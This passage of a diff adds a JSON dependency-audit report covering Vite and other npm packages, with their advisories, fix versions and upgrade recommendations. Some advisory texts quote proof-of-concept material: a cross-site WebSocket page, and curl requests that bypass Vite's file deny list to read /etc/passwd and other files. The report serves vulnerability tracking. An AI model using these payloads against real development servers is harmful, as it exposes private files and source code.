html:\n```html\n<!doctype html>\n<html lang=\"en\">\n    <head>\n        <meta charset=\"utf-8\" />\n        <title>vite CSWSH</title>\n    </head>\n    <body>\n        <div id=\"logs\"></div>\n        <script>\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws://localhost:5173','vite-hmr');\n            ws.onmessage = event => {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        </script>\n    </body>\n</html>\n```\n\n3. Kick off Vite \n\n```\nnpm run dev\n```\n\n4. Load the development server (open `http://localhost:5173/`) as well as the malicious page in the browser. \n5. Edit `src/App.jsx` file and intentionally place a syntax error\n6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed\n\nHere's a video demonstrating the POC:\n\nhttps://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961",
+      "cwes": [
+        {
+          "id": "CWE-1385",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-346",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-350",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-01-21T19:52:55Z",
+        "modifiedDate": "2025-02-07T17:38:57Z",
+        "daysSincePublished": 330
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "6.0.9",
+        "recommendation": "Upgrade to 6.0.9 or later",
+        "fixAvailableSince": "2025-02-07T17:38:57.000Z",
+        "daysSinceFix": 313,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-24010"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-x574-m823-4x7w",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-30208"
+      ],
+      "summary": "Vite bypasses server.fs.deny when using ?raw??",
+      "details": "### Summary\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\nOnly apps explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n`@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes.\n\n### PoC\n```bash\n$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" > /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    <body>\n      <h1>403 Restricted</h1>\n      <p>The request url &quot;/tmp/secret.txt&quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n```",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-03-25T14:00:02Z",
+        "modifiedDate": "2025-03-25T14:00:02Z",
+        "daysSincePublished": 267
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "6.2.3",
+        "recommendation": "Upgrade to 6.2.3 or later",
+        "fixAvailableSince": "2025-03-25T14:00:02.000Z",
+        "daysSinceFix": 267,
+        "monthsSinceFix": 8,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30208"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-xcj6-pq6g-qj4x",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2025-31486"
+      ],
+      "summary": "Vite allows server.fs.deny to be bypassed with .svg or relative paths",
+      "details": "### Summary\n\nThe contents of arbitrary files can be returned to the browser.\n\n### Impact\n\nOnly apps explicitly exposing the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Details\n\n#### `.svg`\n\nRequests ending with `.svg` are loaded at this line.\nhttps://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290\nBy adding `?.svg` with `?.wasm?init` or with `sec-fetch-dest: script` header, the restriction was able to bypass.\n\nThis bypass is only possible if the file is smaller than [`build.assetsInlineLimit`](https://vite.dev/config/build-options.html#build-assetsinlinelimit) (default: 4kB) and when using Vite 6.0+.\n\n#### relative paths\n\nThe check was applied before the id normalization. This allowed requests to bypass with relative paths (e.g. `../../`).\n\n### PoC\n\n```bash\nnpm create vite@latest\ncd vite-project/\nnpm install\nnpm run dev\n```\n\nsend request to read `etc/passwd`\n\n```bash\ncurl 'http://127.0.0.1:5173/etc/passwd?.svg?.wasm?init'\n```\n\n```bash\ncurl 'http://127.0.0.1:5173/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&?raw'\n```",
+      "cwes": [
+        {
+          "id": "CWE-200",
+          "name": "Unknown CWE"
+        },
+        {
+          "id": "CWE-284",
+          "name": "Unknown CWE"
+        }
+      ],
+      "age": {
+        "age": "Last Year",
+        "isRecent": false,
+        "publishedDate": "2025-04-04T14:20:05Z",
+        "modifiedDate": "2025-04-30T17:26:53Z",
+        "daysSincePublished": 257
+      },
+      "affected": {
+        "package": "vite",
+        "version": "4.4.8",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "4.4.8",
+        "fixedIn": "6.2.5",
+        "recommendation": "Upgrade to 6.2.5 or later",
+        "fixAvailableSince": "2025-04-30T17:26:53.000Z",
+        "daysSinceFix": 231,
+        "monthsSinceFix": 7,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-31486"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/commit/62d7e81ee189d65899bb65f3263ddbd85247b647"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/vitejs/vite"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/vitejs/vite/blob/037f801075ec35bb6e52145d659f71a23813c48f/packages/vite/src/node/plugins/asset.ts#L285-L290"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-j8xg-fqg3-53r7",
+      "severity": "LOW",
+      "severityScore": 3.1,
+      "cvssScores": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "aliases": [
+        "CVE-2023-26115"
+      ],
+      "summary": "word-wrap vulnerable to Regular Expression Denial of Service",
+      "details": "All versions of the package word-wrap are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within the result variable.",
+      "cwes": [
+        {
+          "id": "CWE-1333",
+          "name": "Inefficient Regular Expression Complexity (ReDoS)"
+        }
+      ],
+      "age": {
+        "age": "2 year(s) old",
+        "isRecent": false,
+        "publishedDate": "2023-06-22T06:30:18Z",
+        "modifiedDate": "2025-02-13T19:00:43Z",
+        "daysSincePublished": 909
+      },
+      "affected": {
+        "package": "word-wrap",
+        "version": "1.2.3",
+        "ecosystem": "npm"
+      },
+      "fix": {
+        "isStale": true,
+        "currentVersion": "1.2.3",
+        "fixedIn": "1.2.4",
+        "recommendation": "Upgrade to 1.2.4 or later",
+        "fixAvailableSince": "2025-02-13T19:00:43.000Z",
+        "daysSinceFix": 307,
+        "monthsSinceFix": 10,
+        "isOldFix": true
+      },
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26115"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/commit/420dce9a2412b21881202b73a3c34f0edc53cb2e"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jonschlinkert/word-wrap"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/blob/master/index.js#L39"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/blob/master/index.js%23L39"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/jonschlinkert/word-wrap/releases/tag/1.2.4"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.netapp.com/advisory/ntap-20240621-0006"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-4058657"
+        },
+        {
+          "type": "WEB",
+          "url": "https://security.snyk.io/vuln/SNYK-JS-WORDWRAP-3149973"
+        }
+      ]
+    }
+  ],
+  "staleDependencies": [
+    {
+      "package": "brace-expansion",
+      "currentVersion": "1.1.11",
+      "fixedIn": "2.0.2",
+      "vulnerabilities": [
+        "GHSA-v6h2-p8h4-qcjw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 2.0.2 or later",
+      "fixAvailableSince": "2025-06-11T20:54:10.000Z",
+      "daysSinceFix": 188,
+      "monthsSinceFix": 6,
+      "isOldFix": true
+    },
+    {
+      "package": "braces",
+      "currentVersion": "3.0.2",
+      "fixedIn": "3.0.3",
+      "vulnerabilities": [
+        "GHSA-grv7-fg5c-xmjg"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.0.3 or later",
+      "fixAvailableSince": "2024-07-15T22:12:28.795Z",
+      "daysSinceFix": 519,
+      "monthsSinceFix": 17,
+      "isOldFix": true
+    },
+    {
+      "package": "cross-spawn",
+      "currentVersion": "7.0.3",
+      "fixedIn": "7.0.5",
+      "vulnerabilities": [
+        "GHSA-3xgq-45jj-v275"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 7.0.5 or later",
+      "fixAvailableSince": "2025-05-19T19:56:26.000Z",
+      "daysSinceFix": 212,
+      "monthsSinceFix": 7,
+      "isOldFix": true
+    },
+    {
+      "package": "esbuild",
+      "currentVersion": "0.18.20",
+      "fixedIn": "0.25.0",
+      "vulnerabilities": [
+        "GHSA-67mh-4wv8-2f99"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 0.25.0 or later",
+      "fixAvailableSince": "2025-02-10T17:48:08.000Z",
+      "daysSinceFix": 310,
+      "monthsSinceFix": 10,
+      "isOldFix": true
+    },
+    {
+      "package": "js-yaml",
+      "currentVersion": "4.1.0",
+      "fixedIn": "4.1.1",
+      "vulnerabilities": [
+        "GHSA-mh29-5h37-fv8m"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.1.1 or later",
+      "fixAvailableSince": "2025-11-17T15:20:43.000Z",
+      "daysSinceFix": 30,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "micromatch",
+      "currentVersion": "4.0.5",
+      "fixedIn": "4.0.8",
+      "vulnerabilities": [
+        "GHSA-952p-6rrq-rcjv"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.0.8 or later",
+      "fixAvailableSince": "2024-08-28T13:12:26.000Z",
+      "daysSinceFix": 476,
+      "monthsSinceFix": 15,
+      "isOldFix": true
+    },
+    {
+      "package": "nanoid",
+      "currentVersion": "3.3.6",
+      "fixedIn": "5.0.9",
+      "vulnerabilities": [
+        "GHSA-mwcw-c2x4-8c55"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 5.0.9 or later",
+      "fixAvailableSince": "2025-11-04T16:54:54.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "postcss",
+      "currentVersion": "8.4.28",
+      "fixedIn": "8.4.31",
+      "vulnerabilities": [
+        "GHSA-7fh5-64p2-3v2j"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 8.4.31 or later",
+      "fixAvailableSince": "2025-11-04T16:45:01.000Z",
+      "daysSinceFix": 43,
+      "monthsSinceFix": 1,
+      "isOldFix": false
+    },
+    {
+      "package": "rollup",
+      "currentVersion": "3.28.1",
+      "fixedIn": "3.29.5",
+      "vulnerabilities": [
+        "GHSA-gcx4-mw62-g8wm"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 3.29.5 or later",
+      "fixAvailableSince": "2024-09-26T21:11:53.000Z",
+      "daysSinceFix": 446,
+      "monthsSinceFix": 14,
+      "isOldFix": true
+    },
+    {
+      "package": "semver",
+      "currentVersion": "7.3.8",
+      "fixedIn": "7.5.2",
+      "vulnerabilities": [
+        "GHSA-c2qf-rxjj-qqgw"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 7.5.2 or later",
+      "fixAvailableSince": "2024-12-06T20:34:31.000Z",
+      "daysSinceFix": 375,
+      "monthsSinceFix": 12,
+      "isOldFix": true
+    },
+    {
+      "package": "svelte",
+      "currentVersion": "3.50.1",
+      "fixedIn": "4.2.19",
+      "vulnerabilities": [
+        "GHSA-8266-84wp-wv5c"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 4.2.19 or later",
+      "fixAvailableSince": "2024-08-30T20:01:23.000Z",
+      "daysSinceFix": 474,
+      "monthsSinceFix": 15,
+      "isOldFix": true
+    },
+    {
+      "package": "vite",
+      "currentVersion": "4.4.8",
+      "fixedIn": "6.2.6",
+      "vulnerabilities": [
+        "GHSA-356w-63v5-8wf4",
+        "GHSA-4r4m-qw57-chr8",
+        "GHSA-64vr-g452-qvp3",
+        "GHSA-859w-5945-r5v3",
+        "GHSA-8jhw-289h-jh2g",
+        "GHSA-92r3-m2mg-pj97",
+        "GHSA-93m4-6634-74q7",
+        "GHSA-9cwx-2883-4wfx",
+        "GHSA-c24v-8rfc-w8vw",
+        "GHSA-g4jq-h2w9-997c",
+        "GHSA-jqfw-vq24-v9c3",
+        "GHSA-vg6x-rcgg-rjx6",
+        "GHSA-x574-m823-4x7w",
+        "GHSA-xcj6-pq6g-qj4x"
+      ],
+      "severity": "MEDIUM",
+      "recommendation": "Upgrade to 6.2.6 or later",
+      "fixAvailableSince": "2025-04-11T14:06:03.000Z",
+      "daysSinceFix": 250,
+      "monthsSinceFix": 8,
+      "isOldFix": true
+    },
+    {
+      "package": "word-wrap",
+      "currentVersion": "1.2.3",
+      "fixedIn": "1.2.4",
+      "vulnerabilities": [
+        "GHSA-j8xg-fqg3-53r7"
+      ],
+      "severity": "LOW",
+      "recommendation": "Upgrade to 1.2.4 or later",
+      "fixAvailableSince": "2025-02-13T19:00:43.000Z",
+      "daysSinceFix": 307,
+      "monthsSinceFix": 10,
+      "isOldFix": true
+    }
+  ],
+  "recommendations": [
+    {
+      "priority": "MEDIUM",
+      "message": "4 vulnerabilities were recently discovered (< 6 months old)."
+    },
+    {
+      "priority": "HIGH",
+      "message": "19 packages have fixes available for >6 months. Update urgently!"
+    },
+    {
+      "priority": "MEDIUM",
+      "message": "26 packages have known vulnerabilities with available fixes. Update recommended."
+    }
+  ]
+}
